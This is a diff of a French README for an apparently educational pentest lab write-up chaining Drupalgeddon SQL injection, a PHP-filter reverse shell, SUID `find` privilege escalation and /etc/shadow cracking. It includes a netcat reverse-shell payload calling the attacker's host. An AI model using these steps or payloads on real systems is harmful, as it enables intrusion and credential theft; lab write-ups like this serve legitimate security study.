@@ -1,7 +1,5 @@
 # Pentest Lab : Chaîne d'exploitation web et système (Drupal to Root)
 
-![Root Proof](preuves/06_root_proof.png)
-
 
 ##  Disclaimer 
 Ce projet a été réalisé dans un **environnement de laboratoire contrôlé et isolé** à des fins éducatives et académiques. Aucune infrastructure réelle n'a été ciblée. L'objectif est d'apprendre à sécuriser les systèmes en comprenant les mécanismes d'attaque.
@@ -30,7 +28,7 @@ La première étape a consisté à cartographier la surface d'attaque de la mach
 
 **Commande exécutée :** `nmap -sV 192.168.78.132`
 
-![Nmap Scan](preuves/02_nmap_result.png)
+![Nmap Scan](demo/01_nmap_result.png)
 
 **Services identifiés :**
 * **Port 22 (TCP) :** SSH (OpenSSH 6.0p1).
@@ -61,14 +59,14 @@ Exploitation de la faille **CVE-2014-3704 (Drupalgeddon)**. Cette vulnérabilit�
 * **Action :** Injection d'un nouvel utilisateur dans la table `users` avec les droits Administrateur.
 * **Résultat :** Accès au panneau d'administration du CMS.
 
-![Exploit SQLi](preuves/04_sqli_exploit.png)
+![Exploit SQLi](demo/02_python_exploit.png)
 
 ### Étape 2 : Exécution de code (RCE & Reverse Shell)
 Une fois connecté en tant qu'administrateur, utilisation du module natif **PHP Filter**. Ce module, mal configuré, permet d'exécuter du code PHP arbitraire dans les pages du site.
 * **Payload :** `<?php system('nc -e /bin/bash 192.168.78.131 4444'); ?>`
 * **Résultat :** Obtention d'un shell distant sur la machine Kali (utilisateur `www-data`).
 
-![Reverse Shell](preuves/05_reverse_shell.png)
+![Reverse Shell](demo/03_reverse_shell.png)
 
 ### Étape 3 : Escalade de privilèges (Vers Root)
 Analyse des fichiers disposant de la permission **SUID** (Set User ID). Découverte d'une configuration critique sur la commande `find`.
@@ -80,6 +78,7 @@ Une fois l'accès root obtenu, lecture du fichier sensible `/etc/shadow` pour ex
 * **Action :** Utilisation de **John the Ripper** pour casser les hashs SHA-512 par attaque dictionnaire.
 * **Résultat :** Récupération du mot de passe root/utilisateur (faible complexité), permettant une persistance sur le système.
 ---
+![Reverse Shell](demo/05_root_password.png)
 
 ## Synthèse
 
